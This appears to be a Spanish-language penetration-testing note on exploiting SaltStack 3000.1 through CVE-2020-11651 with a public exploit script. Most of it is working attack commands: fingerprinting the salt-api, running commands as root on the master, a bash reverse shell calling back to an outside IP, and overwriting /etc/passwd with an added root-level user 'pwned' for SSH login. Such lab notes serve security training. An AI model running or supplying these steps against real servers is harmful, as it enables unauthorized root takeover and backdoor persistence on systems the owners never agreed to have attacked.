# SaltStack 

Tags: #SaltStack #Linux 

**SaltStack** (o simplemente **Salt**) es una plataforma de **gestión y automatización de infraestructura**. Los administradores la utilizan para administrar **cientos o miles de servidores** desde un único equipo.

```bash 
❯ curl http://IP:8000     # Identificar la API

	{
  "clients": [
    "local",
    "runner",
    "wheel",
    "ssh"
  ],
  "return": "Welcome"
	}


NOTAS:
	- El puerto 8000 expone una API REST porque devuelve un JSON
	- Los clientes (`local`, `runner`, `wheel`, `ssh`) son característicos de SaltStack
```

```bash 
❯ curl -v http://IP:8000    # Obtener la versión 

	HEADER:
	X-Upstream: salt-api/3000-1

Donde: 
	- Producto: Salt API
	- Versión: 3000-1
```

## Exploit Versión 3000.1 

* [CVE-202-11651_Exploit](https://www.exploit-db.com/exploits/48421)

```bash 
# Instalar salt en un entorno virtual para poder usar el exploit 
❯ python3 -m venv venv
❯ source venv/bin/activate
❯ pip3 install salt
```

```bash 
❯ python saltstack.py -h    # Penel de ayuda 

options:
  -h, --help            show this help message and exit
  --master, -m MASTER_IP
  --port, -p MASTER_PORT
  --force, -f
  --debug, -d
  --run-checks, -c
  --read, -r READ_FILE
  --upload-src UPLOAD_SRC
  --upload-dest UPLOAD_DEST
  --exec EXEC           Run a command on the master
  --exec-all EXEC_ALL   Run a command on all minions
```

```bash 
❯ python saltstack.py -m IP_Vic --exec "whoami"   # Ejecutar un comando 

# Verificar que si funcionó:
	[+] Checking salt-master (192.168.160.62:4506) status... ONLINE
	[+] Checking if vulnerable to CVE-2020-11651... YES
	[*] root key obtained: YW+X7MyAJUrsskh2mt7TkF3FvyJaWLbGfylEiu5AdjFu9Rr8ggmt+HuXNPmPn9rfU1T7rmGnPCY=
	[+] Attemping to execute whoami on 192.168.160.62
	[+] Successfully scheduled job: 20260803211557345063

NORA:
	- Si se obtiene la root Key master quiere decir que se esta ejecutando como root 
```

### Forma 1 (Aun no probada)
```bash 
# Verificar conectividad a Kali 
❯ python saltstack.py -m IP_Vic --exec "ping -c 2 IP_Kali"   # Test de conectividad 

❯ tcpdump -i tun0 icmp   # Recibir los paquetes en Kali 
```

```bash 
# Revershell
# Ejecutar un comando para obtener la revershell 
❯ python saltstack.py -m IP_Vic --exec '/bin/bash -c "bash -i >& /dev/tcp/192.168.45.229/4444 0>&1"'   

❯ rlwrap nc -nlvp 4444    # Recibir la revershell 
```

### Forma 2 (Eficaz)
```bash 
Paso 1:
❯ python saltstack.py -m IP_Vic --read '/etc/passwd'     # Leer el archivo passwd
```

```bash 
Paso 2:
❯ openssl passwd -1 -salt abc 123   # Generar el hash de una password controlada por nosotros
	$1$abc$98/EDagBiz63dxD3fhRFk1
	
	# passwd = 123   <-- IMPORTANTE

Donde así queda:
	pwned:$1$abc$98/EDagBiz63dxD3fhRFk1:0:0:pwned:/root:/bin/bash
	
	# pwned = Usuario ficticio que se agrega

Paso 3:
# Crear un archivo 'passwd' agregando el resultado del paso 1 y colocando la parte del paso 2 al final
❯ nvim passwd
```

```bash 
Paso 4:
# Subir el archivo a una ruta segura en la máquina víctima 
❯ python saltstack.py -m 192.168.160.62 --upload-src passwd --upload-dest '../../tmp/passwd'

# Mover y sobreescribir el archivo passwd
❯ python saltstack.py -m 192.168.160.62 --exec 'cp /tmp/passwd /etc/passwd'
```

```bash 
Paso 5:
# Ingresar por SSH con el usuario 'pwned'
❯ ssh pwned@IP
	# Password = 123
```